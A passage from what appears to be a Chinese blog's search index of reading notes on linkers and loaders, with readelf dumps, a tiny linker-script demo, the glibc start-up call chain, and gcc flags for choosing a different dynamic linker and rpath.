class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">4</span>] .note.ABI-tag     NOTE             <span class="number">000000000000038</span>c  <span class="number">0000038</span>c</span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [ <span class="number">5</span>] .gnu.hash         GNU_HASH         <span class="number">00000000000003b</span>0  <span class="number">000003b</span>0</span><br><span class="line">       <span class="number">0000000000000024</span>  <span class="number">0000000000000000</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">6</span>] .dynsym           DYNSYM           <span class="number">00000000000003</span>d8  <span class="number">000003</span>d8</span><br><span class="line">       <span class="number">00000000000000</span>a8  <span class="number">0000000000000018</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [ <span class="number">7</span>] .dynstr           STRTAB           <span class="number">0000000000000480</span>  <span class="number">00000480</span></span><br><span class="line">       <span class="number">000000000000008f</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [ <span class="number">8</span>] .gnu.version      VERSYM           <span class="number">0000000000000510</span>  <span class="number">00000510</span></span><br><span class="line">       <span class="number">000000000000000</span>e  <span class="number">0000000000000002</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">2</span></span><br><span class="line">  [ <span class="number">9</span>] .gnu.version_r    VERNEED          <span class="number">0000000000000520</span>  <span class="number">00000520</span></span><br><span class="line">       <span class="number">0000000000000030</span>  <span class="number">0000000000000000</span>   A       <span class="number">7</span>     <span class="number">1</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">10</span>] .rela.dyn         RELA             <span class="number">0000000000000550</span>  <span class="number">00000550</span></span><br><span class="line">       <span class="number">00000000000000</span>c0  <span class="number">0000000000000018</span>   A       <span class="number">6</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">11</span>] .rela.plt         RELA             <span class="number">0000000000000610</span>  <span class="number">00000610</span></span><br><span class="line">       <span class="number">0000000000000018</span>  <span class="number">0000000000000018</span>  AI       <span class="number">6</span>    <span class="number">24</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">12</span>] .init             PROGBITS         <span class="number">0000000000001000</span>  <span class="number">00001000</span></span><br><span class="line">       <span class="number">000000000000001b</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">13</span>] .plt              PROGBITS         <span class="number">0000000000001020</span>  <span class="number">00001020</span></span><br><span class="line">       <span class="number">0000000000000020</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">14</span>] .plt.got          PROGBITS         <span class="number">0000000000001040</span>  <span class="number">00001040</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">15</span>] .plt.sec          PROGBITS         <span class="number">0000000000001050</span>  <span class="number">00001050</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000010</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">16</span>] .text             PROGBITS         <span class="number">0000000000001060</span>  <span class="number">00001060</span></span><br><span class="line">       <span class="number">0000000000000117</span>  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">16</span></span><br><span class="line">  [<span class="number">17</span>] .fini             PROGBITS         <span class="number">0000000000001178</span>  <span class="number">00001178</span></span><br><span class="line">       <span class="number">000000000000000</span>d  <span class="number">0000000000000000</span>  AX       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">18</span>] .rodata           PROGBITS         <span class="number">0000000000002000</span>  <span class="number">00002000</span></span><br><span class="line">       <span class="number">0000000000000007</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">19</span>] .eh_frame_hdr     PROGBITS         <span class="number">0000000000002008</span>  <span class="number">00002008</span></span><br><span class="line">       <span class="number">0000000000000034</span>  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">4</span></span><br><span class="line">  [<span class="number">20</span>] .eh_frame         PROGBITS         <span class="number">0000000000002040</span>  <span class="number">00002040</span></span><br><span class="line">       <span class="number">00000000000000</span>ac  <span class="number">0000000000000000</span>   A       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">21</span>] .init_array       INIT_ARRAY       <span class="number">0000000000003</span>db8  <span class="number">00002</span>db8</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">22</span>] .fini_array       FINI_ARRAY       <span class="number">0000000000003</span>dc0  <span class="number">00002</span>dc0</span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">23</span>] .dynamic          DYNAMIC          <span class="number">0000000000003</span>dc8  <span class="number">00002</span>dc8</span><br><span class="line">       <span class="number">00000000000001f</span>0  <span class="number">0000000000000010</span>  WA       <span class="number">7</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">24</span>] .got              PROGBITS         <span class="number">0000000000003f</span>b8  <span class="number">00002f</span>b8</span><br><span class="line">       <span class="number">0000000000000048</span>  <span class="number">0000000000000008</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">25</span>] .data             PROGBITS         <span class="number">0000000000004000</span>  <span class="number">00003000</span></span><br><span class="line">       <span class="number">0000000000000010</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">26</span>] .bss              NOBITS           <span class="number">0000000000004010</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">0000000000000008</span>  <span class="number">0000000000000000</span>  WA       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">27</span>] .comment          PROGBITS         <span class="number">0000000000000000</span>  <span class="number">00003010</span></span><br><span class="line">       <span class="number">000000000000002b</span>  <span class="number">0000000000000001</span>  MS       <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">28</span>] .symtab           SYMTAB           <span class="number">0000000000000000</span>  <span class="number">00003040</span></span><br><span class="line">       <span class="number">0000000000000360</span>  <span class="number">0000000000000018</span>          <span class="number">29</span>    <span class="number">18</span>     <span class="number">8</span></span><br><span class="line">  [<span class="number">29</span>] .strtab           STRTAB           <span class="number">0000000000000000</span>  <span class="number">000033</span>a0</span><br><span class="line">       <span class="number">00000000000001e0</span>  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">  [<span class="number">30</span>] .shstrtab         STRTAB           <span class="number">0000000000000000</span>  <span class="number">00003580</span></span><br><span class="line">       <span class="number">000000000000011</span>a  <span class="number">0000000000000000</span>           <span class="number">0</span>     <span class="number">0</span>     <span class="number">1</span></span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span> <span class="number">0x0000000000000040</span></span><br><span class="line">                 <span class="number">0x00000000000002d8</span> <span class="number">0x00000000000002d8</span>  R      <span class="number">0x8</span></span><br><span class="line">  INTERP         <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span> <span class="number">0x0000000000000318</span></span><br><span class="line">                 <span class="number">0x000000000000001c</span> <span class="number">0x000000000000001c</span>  R      <span class="number">0x1</span></span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>]</span><br><span class="line">  LOAD           <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000628</span> <span class="number">0x0000000000000628</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span> <span class="number">0x0000000000001000</span></span><br><span class="line">                 <span class="number">0x0000000000000185</span> <span class="number">0x0000000000000185</span>  R E    <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span> <span class="number">0x0000000000002000</span></span><br><span class="line">                 <span class="number">0x00000000000000ec</span> <span class="number">0x00000000000000ec</span>  R      <span class="number">0x1000</span></span><br><span class="line">  LOAD           <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000258</span> <span class="number">0x0000000000000260</span>  RW     <span class="number">0x1000</span></span><br><span class="line">  DYNAMIC        <span class="number">0x0000000000002dc8</span> <span class="number">0x0000000000003dc8</span> <span class="number">0x0000000000003dc8</span></span><br><span class="line">                 <span class="number">0x00000000000001f0</span> <span class="number">0x00000000000001f0</span>  RW     <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  NOTE           <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span> <span class="number">0x0000000000000368</span></span><br><span class="line">                 <span class="number">0x0000000000000044</span> <span class="number">0x0000000000000044</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_PROPERTY   <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span> <span class="number">0x0000000000000338</span></span><br><span class="line">                 <span class="number">0x0000000000000030</span> <span class="number">0x0000000000000030</span>  R      <span class="number">0x8</span></span><br><span class="line">  GNU_EH_FRAME   <span class="number">0x0000000000002008</span> <span class="number">0x0000000000002008</span> <span class="number">0x0000000000002008</span></span><br><span class="line">                 <span class="number">0x0000000000000034</span> <span class="number">0x0000000000000034</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_STACK      <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span>  RW     <span class="number">0x10</span></span><br><span class="line">  GNU_RELRO      <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000248</span> <span class="number">0x0000000000000248</span>  R      <span class="number">0x1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>链接控制脚本</title>
    <url>/2024/08/16/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/%E9%93%BE%E6%8E%A5%E6%8E%A7%E5%88%B6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>链接器作为一个程序可以精细的控制其的连接过程，学习过段的合并过程，在学习一下如何控制，以写一个比较小的玩具程序作为学习主线。</p>
<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><blockquote>
<p>本次实验用的write</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/usr/include/x86_64-linux-gnu/asm# <span class="built_in">cat</span> unistd_64.h</span><br><span class="line"><span class="comment">#ifndef _ASM_UNISTD_64_H</span></span><br><span class="line"><span class="comment">#define _ASM_UNISTD_64_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define __NR_read 0</span></span><br><span class="line"><span class="comment">#define __NR_write 1</span></span><br><span class="line"><span class="comment">#define __NR_open 2</span></span><br><span class="line"><span class="comment">#define __NR_close 3</span></span><br></pre></td></tr></table></figure>

<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>因为程序结束后会ret到非法地址，我也不想去给他写exit了，知道怎么会是就行了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello world!\n\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movq $13,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq (str),%rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        print();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fno-common -c minihello.c -o min.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld -static -e main -o min min.o</span></span><br><span class="line">root@L:/home/l/c++# ./min</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br><span class="line">root@L:/home/l/c++# ./minds</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<h2 id="链接脚本"><a href="#链接脚本" class="headerlink" title="链接脚本"></a>链接脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTRY(main)</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">    mintext : &#123;*(.text) *(.data) *(.rodata)&#125;</span><br><span class="line">    /DISCARD/ : &#123;*(.comment) *(.strtab)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="差异对比"><a href="#差异对比" class="headerlink" title="差异对比"></a>差异对比</h2><blockquote>
<p>可以看出合并之后少了好几个段</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++# readelf -S minds</span><br><span class="line">There are 8 section headers, starting at offset 0x11b8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.pr[...] NOTE             0000000000000000  00001000</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 2] .eh_frame         PROGBITS         0000000000000020  00001020</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] mintext           PROGBITS         0000000000000078  00001078</span><br><span class="line">       000000000000004e  0000000000000000 WAX       0     0     1</span><br><span class="line">  [ 4] .data.rel.local   PROGBITS         00000000000000c8  000010c8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 5] .symtab           SYMTAB           0000000000000000  000010d0</span><br><span class="line">       0000000000000078  0000000000000018           6     2     8</span><br><span class="line">  [ 6] .strtab           STRTAB           0000000000000000  00001148</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [ 7] .shstrtab         STRTAB           0000000000000000  00001164</span><br><span class="line">       0000000000000050  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">root@L:/home/l/c++# readelf -S min.o</span><br><span class="line">There are 16 section headers, starting at offset 0x310:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000003f  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  00000208</span><br><span class="line">       0000000000000030  0000000000000018   I      13     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 5] .rodata           PROGBITS         0000000000000000  0000007f</span><br><span class="line">       000000000000000f  0000000000000000   A       0     0     1</span><br><span class="line">  [ 6] .data.rel.local   PROGBITS         0000000000000000  00000090</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 7] .rela.data.r[...] RELA             0000000000000000  00000238</span><br><span class="line">       0000000000000018  0000000000000018   I      13     6     8</span><br><span class="line">  [ 8] .comment          PROGBITS         0000000000000000  00000098</span><br><span class="line">       000000000000002c  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 9] .note.GNU-stack   PROGBITS         0000000000000000  000000c4</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [10] .note.gnu.pr[...] NOTE             0000000000000000  000000c8</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .eh_frame         PROGBITS         0000000000000000  000000e8</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [12] .rela.eh_frame    RELA             0000000000000000  00000250</span><br><span class="line">       0000000000000030  0000000000000018   I      13    11     8</span><br><span class="line">  [13] .symtab           SYMTAB           0000000000000000  00000140</span><br><span class="line">       00000000000000a8  0000000000000018          14     4     8</span><br><span class="line">  [14] .strtab           STRTAB           0000000000000000  000001e8</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [15] .shstrtab         STRTAB           0000000000000000  00000280</span><br><span class="line">       0000000000000089  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>一些库调用链</title>
    <url>/2024/08/17/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/%E4%B8%80%E4%BA%9B%E5%BA%93%E8%B0%83%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="关于链接器的库装载过程"><a href="#关于链接器的库装载过程" class="headerlink" title="关于链接器的库装载过程"></a>关于链接器的库装载过程</h1><p>学习了动态链接的过程之后，想深入学习一下，奈何实现过程过于复杂，实在没有能力去理解代码，就了解一下其调用过程吧，以64位程序动态链接为例子。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_start -&gt; _dl_start，这两步主要是链接器的自举，跳过中间几步的关于数据收集的一些函数就到了</span><br><span class="line">dl_main这个函数，可以看出实现基本尚在rtld.c这个文件，但最开始start的函数是在dl-machine.h定义的，可以自行观看。</span><br><span class="line"></span><br><span class="line">pwndbg&gt; info b</span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">6       breakpoint     keep y   0x00007ffff7fe44e0 in elf_machine_rela at ../sysdeps/x86_64/dl-machine.h:323</span><br><span class="line">7       breakpoint     keep y   0x00007ffff7fe4030 in _dl_start at ./elf/rtld.c:527</span><br><span class="line">8       breakpoint     keep y   0x00007ffff7fe4517 in _dl_start at ./elf/rtld.c:588</span><br><span class="line">9       breakpoint     keep y   0x00007ffff7fe48e0 in dl_main at ./elf/rtld.c:1320</span><br><span class="line">10      breakpoint     keep y   &lt;MULTIPLE&gt;         </span><br><span class="line">        breakpoint already hit 1 time</span><br><span class="line">10.1                        y   0x0000555555555060 &lt;_start&gt;</span><br><span class="line">10.2                        y   0x00007ffff7fe3290 &lt;_start&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/img/mypic/com/dlmain.png" alt="dlmain"></p>
<p>可以看出dlmain是完成装载的核心函数。因此想要分析链接器的实现可以从上述调用链入手。但是慎入吧。</p>
<h1 id="关于main执行前的一些步骤以及程序退出处理"><a href="#关于main执行前的一些步骤以及程序退出处理" class="headerlink" title="关于main执行前的一些步骤以及程序退出处理"></a>关于main执行前的一些步骤以及程序退出处理</h1><blockquote>
<p>除了链接器中有<code>__start</code>函数，动态链接库中也有，会在main开始之前完成一些列复杂操作，但是在此之前发现了个好玩的东西，也就是在<code>__start</code>函数执行前，动态链接器还会执行<code>_dl_init</code>等函数，好像是库依赖关系之间的处理，不知道是干什么的。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">执行链，不知道是不是因为程序不是c++，所以没有调用csu，c++的估计才是完全版</span><br><span class="line">_start-&gt;__libc_start_main-&gt;__cxa_atexit（貌似是析构函数的注册表）-&gt;init(进行main前的准备)-&gt;frame_dummy(这玩意困惑了好长时间一直不知道干什么有机会深入研究吧)-&gt; _dl_audit_preinit(又是一个奇怪的东西)-&gt;__libc_start_call_main(还好没有跳过，这个函数里面会调用main函数...)-&gt;main-&gt;exit-&gt;__run_exit_handlers-&gt;__call_tls_dtors-&gt;_dl_fini(看样子进入和退出都会经过连接器啊)-&gt;_IO_cleanup(刷新IO)-&gt;_exit(最后的最后调用系统调用kill掉pro)</span><br></pre></td></tr></table></figure>













]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
  <entry>
    <title>gcc天问之路</title>
    <url>/2024/08/09/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/gcc%E5%A4%A9%E9%97%AE%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h1 id="gcc链接器"><a href="#gcc链接器" class="headerlink" title="gcc链接器"></a>gcc链接器</h1><h2 id="探坑之路"><a href="#探坑之路" class="headerlink" title="探坑之路"></a>探坑之路</h2><p>因为要为malloc的漏洞利用写demo，需要不同版本的共享库，之前一直再逃避写demo这件事，一直用的可执行文件，利用patchelf来更改链接器路径，但是为了深入学习还是得自己写demo，需要掌握编译链接的全过程。</p>
<p>一定要记住GUN不止GCC，gcc的时候也不是仅仅用gcc，遵从stfm的原则，想深入了解一下汇编链接的全过程去查看了一下gcc的文档，好无知，哈哈哈，明明更改动态链接库的版本需要的是ld，为什么要看gcc的文档呢，还是因为-Wl选项救了我，一看解释居然是给链接器传递参数。哈哈哈。接着赶快去看linker的文档，主要用上了这两个选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--rpath=...</span><br><span class="line">--dynamic-linker=....</span><br></pre></td></tr></table></figure>

<p>–rpath选项按文档上说是链接时查找的共享对象，但是我对这个共享库也知道甚少，因此对于其也仅仅会用的状态。</p>
<p>–dynamic-linker选项按文档的解释是更改linker的可执行文件，彻底激发了我的好奇心，原来linker可以被直接使用的，一直以为是个库，哈哈哈哈，无知的我。然后就去查了ld的文件类型。结果：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ file ld</span><br><span class="line">ld: symbolic link to x86_64-linux-gnu-ld</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld</span><br><span class="line">x86_64-linux-gnu-ld: symbolic link to x86_64-linux-gnu-ld.bfd</span><br><span class="line">l@L:/usr/bin$ file x86_64-linux-gnu-ld.bfd</span><br><span class="line">x86_64-linux-gnu-ld.bfd: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c93d251e4e665bc9768ef05ba3086b166e95ec2b, for GNU/Linux 3.2.0, stripped</span><br><span class="line">l@L:/usr/bin$ file /lib64/ld-linux-x86-64.so.2</span><br><span class="line">/lib64/ld-linux-x86-64.so.2: symbolic link to /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">l@L:/usr/bin$ file /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class="line">/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, BuildID[sha1]=4186944c50f8a32b47d74931e3f512b811813b64, stripped</span><br></pre></td></tr></table></figure>

<p>盲菜ld这个东西是一个封装后的可以被人使用的程序，但是本质来看还是ld-linux-x86-64.so.2，调用其会出现：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">l@L:/usr/bin$ /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --help</span><br><span class="line">Usage: /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 [OPTION]... EXECUTABLE-FILE [ARGS-FOR-PROGRAM...]</span><br><span class="line">You have invoked &#x27;ld.so&#x27;, the program interpreter for dynamically-linked</span><br><span class="line">ELF programs.  Usually, the program interpreter is invoked automatically</span><br><span class="line">when a dynamically-linked executable is started.</span><br><span class="line"></span><br><span class="line">You may invoke the program interpreter program directly from the command</span><br><span class="line">line to load and run an ELF executable file; this is like executing that</span><br><span class="line">file itself, but always uses the program interpreter you invoked,</span><br><span class="line">instead of the program interpreter specified in the executable file you</span><br><span class="line">run.  Invoking the program interpreter directly provides access to</span><br><span class="line">additional diagnostics, and changing the dynamic linker behavior without</span><br><span class="line">setting environment variables (which would be inherited by subprocesses).</span><br></pre></td></tr></table></figure>

<p>坑越来越深，哈哈哈。</p>
<p>不过还是先记录下更改链接器的选项，不然又得查了：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc top_chunk_demo1.c -Wl,--rpath=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 -Wl,--dynamic-linker=/home/l/how2heap/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so</span><br></pre></td></tr></table></figure>

<h2 id="无端猜测"><a href="#无端猜测" class="headerlink" title="无端猜测"></a>无端猜测</h2><p>本来挖出来的坑很多，要不就趁此机会把elf文件类型和编译过程真正搞通透，为未来的逆向打好基础，因为最近在学编译原理，一想，我还是把编译原理学完再说吧，效率高一点，编译原理目前是学到了yacc，以我浅薄的知识盲猜一下这个gcc的linker过程，汇编啥的不说了，所谓动态链接我猜测就是类似于python的解释过程，因为我在上述挖坑时看elf段意外发现了interpret这个段，楞一看这玩意跟解释器啥区别，之前一听解释器居然完全没联想起来，我一想动态连接，这玩意不就是在运行时需要啥拿啥吗，这python的解释器也是边解释边运行啊，编译模式的编译器，解释模式的编译器各有优点，这GUN怎么都有啊。。。。。难道时两者有点的结合？？我不知道，等学完编译原理再来补下面的吧，哈哈哈。</p>
]]></content>
      <categories>
        <category>读书笔记</category>
        <category>程序员的自我修养，链接装载与库</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>程序员的自我修养，链接装载与库</tag>
      </tags>
  </entry>
</search>
